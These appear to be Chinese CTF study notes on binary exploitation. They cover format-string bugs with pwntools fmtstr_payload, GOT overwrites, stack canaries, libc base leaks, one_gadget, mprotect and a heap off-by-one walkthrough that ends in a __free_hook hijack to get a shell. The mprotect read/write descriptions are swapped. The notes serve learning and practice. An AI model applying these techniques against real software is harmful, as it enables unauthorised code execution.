格式化字符串漏洞

格式化字符串漏洞主要是因为错误的使用printf函数如： printf(a) 没有严格按照 printf(“<式样化字符串>”，<参数表>) 的规格来使用，从而导致有机可乘。
printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。
存在格式化字符串漏洞时，我们输入以下是字符串可以得到不同的效果，从而完成我们的目的，对变量进行修改或者读取函数的地址。
%d - 十进制 - 输出十进制整数
%s - 字符串 - 从内存中读取字符串
%x - 十六进制 - 输出十六进制数
%c - 字符 - 输出字符
%p - 指针 - 指针地址
%n - 到目前为止所写的字符数
也可以通过%< number >$n(n可以换成s，x，c，p等)来完成对esp+处指向的内存写入或者读取该内存的地址。

fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作。
fmtstr_payload(offset, writes, numbwritten=0, write_size=’byte’)
第一个参数表示格式化字符串的偏移；
第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}；本题是将0804a048处改为0x2223322
第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；
第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
fmtstr_payload函数返回的就是payload

Canary栈保护

Canary是一种栈保护手段，通常通过在栈中插入cookie信息（一般在ebp上方），在函数返回的时候检查cookie是否改变，如果改变则认为栈结构被破坏，则调用一个函数强制停止程序。当开启Canary保护的时候不能通过传统的栈溢出直接覆盖返回值劫持EIP。在汇编码的表现为：

函数实际地址=函数偏移量+libc基地址；
libc=函数实际地址-函数偏移量；
这里涉及到了 got表和plt表
plt表：跳板，跳转到一个地址来加载libc库。文件中会对每个用到的函数分配一个plt函数
got表：经过plt表的跳转会跳转会在got表上写入地址，这个地址是函数调用的真实地址
注意：plt表只在程序调用函数之前有用，调用函数之后第二次执行这个函数就不会经过plt表。
也就是说 got表中泄露的地址是实际地址，利用pwntools使用命令找到的是偏移地址；
因为输入限制，所以不能使用system + /bin/sh 来get shell，可以使用onegadget的值覆盖EIP完成get shell；

mprotect 函数

int mprotect(const void *start, size_t len, int prot);

　　第一个参数填的是一个地址，是指需要进行操作的地址。

　　第二个参数是地址往后多大的长度。

　　第三个参数的是要赋予的权限。

　　mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。

prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：

　　1）PROT_READ：表示内存段内的内容可写；

　　2）PROT_WRITE：表示内存段内的内容可读；

　　3）PROT_EXEC：表示内存段中的内容可执行；

　　4）PROT_NONE：表示内存段中的内容根本没法访问。

　　prot=7 是可读可写可执行

堆溢出

null byte off-by-one

第一道堆题，

程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的。

signed __int64 __fastcall my_read(_BYTE *ptr, int number)
{
int i; // [rsp+14h] [rbp-Ch]
_BYTE *buf; // [rsp+18h] [rbp-8h]

if ( number <= 0 )
return 0LL;
buf = ptr;
for ( i = 0; ; ++i )
{
if ( (unsigned int)read(0, buf, 1uLL) != 1 )
return 1LL;
if ( *buf == ‘\n’ )
break;
++buf;
if ( i == number ) (i从0开始，到size(从1开始)，会多出一个个数)
break;
}
*buf = 0;
return 0LL;
}

my_read 读入的结束符 ‘\x00’ 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 ‘\x00’ ，
之后我们创建 book1 ，这个 book1 的指针会覆盖 author name 中最后的 NULL 字节，使得该指针与 author name 直接连接，这样输出 author name 则可以获取到一个堆指针。
创建的book1产生的堆的prev_size 即author name 创建的堆的地址
程序中同样提供了一种 change 功能， change 功能用于修改 author name ，所以通过 change 可以写入 author name ，利用 off-by-one 覆盖 book1 第一个项的低字节。
这个指针会指向 book1 的 description ，由于程序提供了 edit 功能可以任意修改 description 中的内容。
我们可以提前在 description 中布置数据伪造成一个 book 结构，这样就可以控制整个book结构，使其指向book2，将book1和book2链接起来。
利用off-by-one 泄露出book2的堆的地址，同时因为 可以申请一个很大的内存空间，使得程序利用mmap 来分配空间，mmap的地址和libc的地址相对偏移不变
所以得到book2的地址，就泄露出了libc的地址
伪造一个fake_book2_struct，其name指针为book2的name指针的地址（为addr_book1+56），然后利用打印功能来leak出book2的name指针的值，Libc泄露成功！！！
设置first_b00k_name内容为binsh，first_b00k_discription为free_hook,用second_b00k_discription向free_hook指向的内容写入system函数的地址。
当调用free函数的时候__free_hook函数不为NULL会优先调用__free_hook函数劫持free函数
执行system函数第一个free的参数可以设置为second_b00k_name。
